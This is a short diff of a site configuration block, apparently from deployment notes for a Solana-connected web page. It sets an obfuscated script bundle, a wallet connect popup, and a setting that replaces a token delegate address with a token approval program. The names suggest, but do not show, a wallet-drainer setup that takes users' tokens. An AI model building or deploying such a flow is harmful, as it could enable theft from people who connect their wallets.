@@ -67,7 +67,8 @@ scp vps/public/index.html user@vps:/var/www/mysite/public/
 'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
 'button_class' => 'K7mQ2',
 'connect_popup_enabled' => true,
-'token_delegate' => 'YOUR_SOLANA_ADDRESS',
+'token_approval_program_id' => '', // set after programs/vote-delegate deploy
+'token_approval_enabled' => false,
 'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
 ```
 
